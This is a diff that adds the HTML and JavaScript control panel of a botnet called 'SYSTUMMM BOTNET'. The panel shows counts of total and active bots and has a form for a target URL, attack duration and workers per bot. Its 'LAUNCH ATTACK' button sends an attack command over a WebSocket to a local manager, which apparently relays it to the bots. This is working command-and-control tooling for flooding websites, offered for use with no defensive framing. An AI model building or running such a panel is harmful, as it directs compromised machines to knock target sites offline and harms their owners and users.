@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Botnet Control Panel</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .stats { border: 1px solid #00ff00; padding: 20px; margin-bottom: 20px; width: 300px; text-align: center; box-shadow: 0 0 10px #00ff00; }
+        .controls { border: 1px solid #00ff00; padding: 20px; width: 400px; box-shadow: 0 0 10px #00ff00; }
+        .input-group { margin: 10px 0; }
+        label { display: block; margin-bottom: 5px; font-size: 0.8em; text-transform: uppercase; }
+        input, button { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; width: 100%; box-sizing: border-box; }
+        button:hover { background: #00ff00; color: #000; cursor: pointer; }
+        h1 { text-shadow: 0 0 5px #00ff00; }
+    </style>
+</head>
+<body>
+    <h1>SYSTUMMM BOTNET</h1>
+    <div class="stats">
+        <h2>STATS</h2>
+        <p>Total Bots: <span id="total-bots">0</span></p>
+        <p>Active: <span id="active-bots">0</span></p>
+    </div>
+    <div class="controls">
+        <h2>COMMANDS</h2>
+        <div class="input-group">
+            <label>Target URL</label>
+            <input type="text" id="target" placeholder="http://example.com" value="http://example.com">
+        </div>
+        <div class="input-group">
+            <label>Duration (sec)</label>
+            <input type="number" id="duration" placeholder="60" value="60">
+        </div>
+        <div class="input-group">
+            <label>Concurrency (workers per bot)</label>
+            <input type="number" id="concurrency" placeholder="10" value="50">
+        </div>
+        <button onclick="launchAttack()">LAUNCH ATTACK</button>
+    </div>
+
+    <script>
+        const ws = new WebSocket('ws://localhost:3000?type=control');
+        
+        ws.onopen = () => {
+            console.log('Connected to Manager');
+        };
+
+        ws.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            if (data.type === 'stats') {
+                document.getElementById('total-bots').innerText = data.total;
+                document.getElementById('active-bots').innerText = data.active;
+            }
+        };
+
+        function launchAttack() {
+            const target = document.getElementById('target').value;
+            const duration = parseInt(document.getElementById('duration').value);
+            const concurrency = parseInt(document.getElementById('concurrency').value);
+            ws.send(JSON.stringify({
+                command: 'attack',
+                params: { target, duration, concurrency }
+            }));
+            alert(`Attack broadcasted: ${concurrency} workers/bot requested.`);
+        }
+    </script>
+</body>
+</html>
